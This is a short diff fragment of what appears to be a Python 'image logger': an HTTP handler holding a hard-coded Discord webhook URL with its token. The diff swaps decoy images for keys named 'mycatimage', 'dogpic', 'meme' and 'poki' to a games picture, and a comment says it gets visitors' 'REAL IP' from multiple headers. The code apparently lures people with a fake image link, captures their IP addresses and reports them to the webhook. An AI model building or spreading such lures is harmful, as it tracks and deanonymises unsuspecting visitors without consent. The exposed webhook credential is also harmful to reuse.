@@ -9,14 +9,14 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
+        DEFAULT_IMAGE = "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg"
         
         # Custom image mappings
         IMAGES = {
-            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
-            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
-            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
-            "poki": "https://i.imgur.com/5M6F3wQ.jpeg",
+            "mycatimage": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
+            "dogpic": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
+            "meme": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
+            "poki": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
         }
         
         # Get REAL IP - try multiple headers
